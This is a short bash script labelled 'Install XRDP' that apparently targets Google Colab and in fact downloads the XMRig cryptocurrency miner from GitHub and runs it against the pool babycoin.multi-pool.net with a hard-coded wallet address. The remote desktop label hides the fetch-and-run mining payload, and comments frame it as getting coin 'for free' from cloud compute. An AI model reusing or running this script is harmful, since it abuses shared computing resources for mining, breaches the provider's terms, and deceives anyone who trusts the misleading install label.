#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-bionic-x64.tar.gz
tar xvzf xmrig-6.16.4-bionic-x64.tar.gz
cd xmrig-6.16.4
./xmrig --url babycoin.multi-pool.net:3333 --user babyz8FUeNEPnS4hoWPvojHuzk6gm1EsVhS8zayPApWXWQMS8rGZmB65yCPZiYQdBkhAJFiJsn2YY83T9WWCSf9miHexhDDNeDk --algo rx/arq
